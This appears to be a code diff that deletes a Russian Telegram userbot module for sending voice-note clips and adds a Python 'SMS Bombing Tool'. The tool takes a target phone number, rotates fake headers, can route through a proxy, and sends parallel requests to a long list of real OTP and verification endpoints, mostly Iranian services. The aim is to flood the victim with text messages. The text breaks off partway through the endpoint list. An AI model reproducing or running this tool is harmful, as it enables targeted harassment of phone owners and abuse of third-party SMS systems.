@@ -1,977 +1,330 @@
-# meta developer: @hikkamodes
-# scope: hikka_only
-# scope: hikka_min 1.2.10
-# requires: urllib requests
-import random
-from asyncio import sleep
+import argparse
+import concurrent.futures
 import os
-from .. import loader, utils
-from telethon.tl.functions.users import GetFullUserRequest
-import time 
-from telethon.tl.types import Message
+import requests
+from datetime import datetime
+from time import sleep
+import signal
+from alive_progress import alive_bar
+from fake_headers import Headers
+from colorama import Fore, Style
 
-class voicemal(loader.Module): 
+headers = Headers()
 
-    '''🙂Напиши любую команду!'''
-     
-    
-    strings = {
-    "name": "полностью",
-    "loading": "<b>Загрузка...</b>",
-    "not_chat": "<b>Test</b>",}
 
-    async def client_ready(self, client, db) -> None:
-        self.db = db
-        self.client = client
-       
-    async def gqcmd(self, message):
-        """- А ɜᴀчᴇʍ  ᴛᴇбᴇ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/5", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gwmd(self, message):
-        """- Дᥲ ᥲ ᴛы"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/7", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gecmd(self, message):
-        """- А ᴛы"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/8", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def grcmd(self, message):
-        """- А чᴛᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/9", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gtcmd(self, message):
-        """- Вᴏɜʍᴏжнᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/10", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gycmd(self, message):
-        """- Обиднᴏ ᴋᴀᴋ бы"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/11", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gucmd(self, message):
-        """- Мᴏй ᴀйди ʙᴋ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/12", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gicmd(self, message):
-        """- Мᴏй ɜᴀйᴋᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/13", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gocmd(self, message):
-        """- Ну ʍнᴇ инᴛᴇᴩᴇ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/14", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gpcmd(self, message):
-        """- Мнᴇ 13"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/15", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gscmd(self, message):
-        """- Мᴏжᴇᴛ ᴨᴏйᴛи ʙ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/17", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gdcmd(self, message):
-        """- Мᴏжᴇᴛ быᴛь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/18", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def ggcmd(self, message):
-        """- Нᴏᴩʍᴀᴧьнᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/20", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def ghcmd(self, message):
-        """- Аᴧᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/21", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gjcmd(self, message):
-        """- Нᴇ ᴨᴏᴋᴀжу"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/23", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gkcmd(self, message):
-        """- Ой ʙᴄë"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/24", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def glcmd(self, message):
-        """- Нᴇ ᴄᴋᴀжу"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/25", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gzcmd(self, message):
-        """- Нᴇ ʙᴩи"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/26", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gxcmd(self, message):
-        """- Нᴇ дуʍᴀю"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/27", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gccmd(self, message):
-        """- Нᥱ ᥰ᧐ня᧘ᥲ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/28", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gvcmd(self, message):
-        """- Нᴇ ᴨиɯи ʍнᴇ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/29", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gbcmd(self, message):
-        """- Нᴇᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/30", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gncmd(self, message):
-        """- Нᴇ буду"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/31", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def gmcmd(self, message):
-        """- Нᴇ ɜнᴀю"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/32", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qqcmd(self, message):
-        """- Нᴇ ᴨᴧᴏхᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/33", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qwcmd(self, message):
-        """- Я бᴇᴄᴨᴧᴀᴛнᴏ нᴇ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/34", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qecmd(self, message):
-        """- Нᴇᴛ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/35", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qrcmd(self, message):
-        """- Нᴇᴛу"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/36", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qtcmd(self, message):
-        """- Вᴄë удᴀчи"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/37", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qycmd(self, message):
-        """- Вᴄë"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/38", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qucmd(self, message):
-        """- Оᴛᴋудᴀ ᴛы"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/39", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qicmd(self, message):
-        """- Оᴛᴋудᴀ ᴛы ɜн"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/40", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qpcmd(self, message):
-        """- Ну бᴧин"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/41", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qacmd(self, message):
-        """- Ну дᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/42", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qscmd(self, message):
-        """- Ну ᴨᴏдуʍᴀю"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/43", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qdcmd(self, message):
-        """- Ну чᴛᴏ ᴛᴀʍ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/44", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qfcmd(self, message):
-        """- Муɜыᴋу ᴄᴧуɯᴀю"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/45", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qgcmd(self, message):
-        """- Очᴇнь ᴨᴩияᴛнᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/46", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-       
-    async def qhcmd(self, message):
-        """- Дᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/47", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qjcmd(self, message):
-        """- Дᴏбᴀʙь ʍᴇня ʙ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/48", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qkcmd(self, message):
-        """- Дᴀʙᴀй ɜᴀʙᴛᴩᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/49", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qlcmd(self, message):
-        """- Дᴀʙᴀй ᴄᴇйчᴀᴄ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/50", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qzcmd(self, message):
-        """- Дᴏбᴩᴏᴇ уᴛᴩᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/51", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qxcmd(self, message):
-        """- Дᴏбᴩый ʙᴇчᴇᴩ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/52", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qccmd(self, message):
-        """- Дᴏбᴩый дᴇнь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/53", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qvcmd(self, message):
-        """- Зᴀʙᴛᴩᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/54", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qbcmd(self, message):
-        """- Лᴀднᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/55", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qncmd(self, message):
-        """- Пᴏᴨᴏɜжᴇ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/56", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def qmcmd(self, message):
-        """- Зᴀй"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/57", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wqcmd(self, message):
-        """- Пᴏйдᴇᴛ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/58", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wwcmd(self, message):
-        """- Пᴏᴋᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/59", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wecmd(self, message):
-        """- Пᴏᴛᴏʍ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/60", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wrcmd(self, message):
-        """- Иди нᴀхуй"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/61", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wtcmd(self, message):
-        """- Иɜʙини ᴨᴏжᴀᴧуйᴄᴛᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/62", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wycmd(self, message):
-        """- Иɜʙини"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/63", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wucmd(self, message):
-        """- Пᴧᴏхᴏ ᴄᴧыɯнᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/64", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wocmd(self, message):
-        """- Пидр"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/66", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wpcmd(self, message):
-        """- Прости"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/67", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wacmd(self, message):
-        """- Пᴩиʙᴇᴛ дᴀʙᴀй"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/68", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wscmd(self, message):
-        """- Пᴩиʙᴇᴛ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/69", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wdcmd(self, message):
-        """- Пᴩиʙᴇᴛиᴋ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/70", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wfcmd(self, message):
-        """- Пᴩиᴋинь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/71", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def whcmd(self, message):
-        """- Пᴧᴏхᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/72", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def whcmd(self, message):
-        """- Плохо"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/73", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wjcmd(self, message):
-        """- Кᴀᴋ хᴏчᴇɯь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/74", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wkcmd(self, message):
-        """- Кидᴀй"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/75", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wlcmd(self, message):
-        """- Кᴩᴀᴄиʙᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/76", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wzcmd(self, message):
-        """- Кᴩуᴛᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/77", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wxcmd(self, message):
-        """- Кᴛᴏ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/78", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wccmd(self, message):
-        """- Гуᴧяᴛь ᴄᴏбиᴩᴀюᴄь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/79", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wvcmd(self, message):
-        """- С ᴨᴩᴀɜдниᴋᴏʍ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-        
-            message.to_id,
-            "https://t.me/gs12lett/106", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wbcmd(self, message):
-        """- Виᴋᴀ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/81", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wncmd(self, message):
-        """- Сᴧᴀдᴋих ᴄнᴏʙ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/108", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def wmcmd(self, message):
-        """- Сᴨᴏᴋᴏйнᴏй нᴏчи"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/109", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def eqcmd(self, message):
-        """- Сᴋᴏᴧьᴋᴏ ᴛᴇбᴇ ᴧᴇᴛ"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/110", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def ewcmd(self, message):
-        """- Сᴋинь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/111", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def ercmd(self, message):
-        """- Ты хᴏчᴇɯь ʍᴇня """
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/113", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
-        
-    async def etcmd(self, message):
-        """- Я ᴏбидᴇᴧᴀᴄь"""
-        reply = await message.get_reply_message()
-        await message.delete()
-        await message.client.send_file(
-            message.to_id,
-            "https://t.me/gs12lett/114", 
-            voice_note=True,
-            reply_to=reply.id if reply else None,
-        )
-        return
+def send_request(api_name, api_url, data, timeout, proxy=None):
+    generated_headers = headers.generate()
+    current_time = datetime.now().strftime("%H:%M:%S")
+
+    try:
+        response = requests.post(
+            api_url,
+            headers=generated_headers,
+            json=data,
+            timeout=timeout,
+            proxies=proxy,
+        )
+        response.raise_for_status()
+
+        return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
+    except requests.exceptions.RequestException as e:
+        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
+
+
+def process_target(api, proxy):
+    return send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)
+
+
+def sigint_handler(signal, frame):
+    print(f"\n{Fore.YELLOW}[!] User interrupted the process.{Style.RESET_ALL}")
+    os._exit(1)
+
+
+def main():
+    signal.signal(signal.SIGINT, sigint_handler)
+
+    parser = argparse.ArgumentParser(description="SMS Bombing Tool")
+    parser.add_argument(
+        "-t", "--target", help="Specify the target phone number", required=True
+    )
+    parser.add_argument(
+        "-n",
+        "--times",
+        help="Specify the number of bombing times, default is 1",
+        type=int,
+        default=1,
+    )
+    parser.add_argument(
+        "--process",
+        help="Specify the number of processes, default is 5",
+        type=int,
+        default=5,
+    )
+    parser.add_argument(
+        "-v", "--verbose", help="Display additional info. -v", action="store_true"
+    )
+    parser.add_argument("-x", "--proxy", help="Set the proxy for requests (http/https)")
+
+    args = parser.parse_args()
+
+    phone_number = args.target
+    bombing_times = args.times
+    process_num = args.process
+    verbose_level = args.verbose
+    proxy = args.proxy
+
+    if proxy:
+        print(f"Using proxy: {proxy}")
+        proxy_dict = {"http": proxy, "https": proxy}
+    else:
+        proxy_dict = None
+
+    apis = [
+        {
+            "name": "Snapp V1",
+            "url": "https://api.snapp.ir/api/v1/sms/link",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Snapp V2",
+            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
+            "data": {"cellphone": phone_number},
+        },
+        {
+            "name": "yandex",
+            "url": "https://passport.yandex.ru/auth/reg",
+            "data": {"phone": f"98{phone_number[1:]}"},
+        },
+        {
+            "name": "Zigap",
+            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
+            "data": {"phoneNumber": f"+98{phone_number[1:]}"},
+        },
+        {
+            "name": "Jabama",
+            "url": "https://gw.jabama.com/api/v4/account/send-code",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Banimode",
+            "url": "https://mobapi.banimode.com/api/v2/auth/request",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Classino",
+            "url": "https://student.classino.com/otp/v1/api/login",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Digikala V1",
+            "url": "https://api.digikala.com/v1/user/authenticate/",
+            "data": {"username": phone_number, "otp_call": False},
+        },
+        {
+            "name": "Digikala V2",
+            "url": "https://api.digikala.com/v1/user/forgot/check/",
+            "data": {"username": phone_number},
+        },
+        {
+            "name": "Sms.ir",
+            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
+            "data": phone_number,
+        },
+        {
+            "name": "Alibaba",
+            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+            "data": {"phoneNumber": phone_number[1:]},
+        },
+        {
+            "name": "Divar",
+            "url": "https://api.divar.ir/v5/auth/authenticate",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Sheypoor",
+            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
+            "data": {"username": phone_number},
+        },
+        {
+            "name": "Bikoplus",
+            "url": "https://bikoplus.com/account/check-phone-number",
+            "data": {"phoneNumber": phone_number},
+        },
+        {
+            "name": "Mootanroo",
+            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
+            "data": {"PhoneNumber": phone_number},
+        },
+        {
+            "name": "Tap33",
+            "url": "https://tap33.me/api/v2/user",
+            "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
+        },
+        {
+            "name": "Tapsi",
+            "url": "https://api.tapsi.ir/api/v2.2/user",
+            "data": {
+                "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
+                "otpOption": "SMS",
+            },
+        },
+        {
+            "name": "GapFilm",
+            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
+            "data": {"Type": "3", "Username": phone_number[1:]},
+        },
+        {
+            "name": "IToll",
+            "url": "https://app.itoll.com/api/v1/auth/login",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Anargift",
+            "url": "https://api.anargift.com/api/v1/auth/auth",
+            "data": {"mobile_number": phone_number},
+        },
+        {
+            "name": "Nobat",
+            "url": "https://nobat.ir/api/public/patient/login/phone",
+            "data": {"mobile": phone_number[1:]},
+        },
+        {
+            "name": "Lendo",
+            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Hamrah-Mechanic",
+            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
+            "data": {"PhoneNumber": phone_number},
+        },
+        {
+            "name": "Abantether",
+            "url": "https://abantether.com/users/register/phone/send/",
+            "data": {"phoneNumber": phone_number},
+        },
+        {
+            "name": "OKCS",
+            "url": "https://my.okcs.com/api/check-mobile",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Tebinja",
+            "url": "https://www.tebinja.com/api/v1/users",
+            "data": {"username": phone_number},
+        },
+        {
+            "name": "Bit24",
+            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Rojashop",
+            "url": "https://rojashop.com/api/send-otp-register",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Paklean",
+            "url": "https://client.api.paklean.com/download",
+            "data": {"tel": phone_number},
+        },
+        {
+            "name": "Khodro45",
+            "url": "https://khodro45.com/api/v1/customers/otp/",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Delino",
+            "url": "https://www.delino.com/user/register",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "DigikalaJet",
+            "url": "https://api.digikalajet.ir/user/login-register/",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Miare",
+            "url": "https://www.miare.ir/api/otp/driver/request/",
+            "data": {"phone_number": phone_number},
+        },
+        {
+            "name": "Dosma",
+            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Ostadkr",
+            "url": "https://api.ostadkr.com/login",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Sibbazar",
+            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
+            "data": {"username": phone_number},
+        },
+        {
+            "name": "Namava",
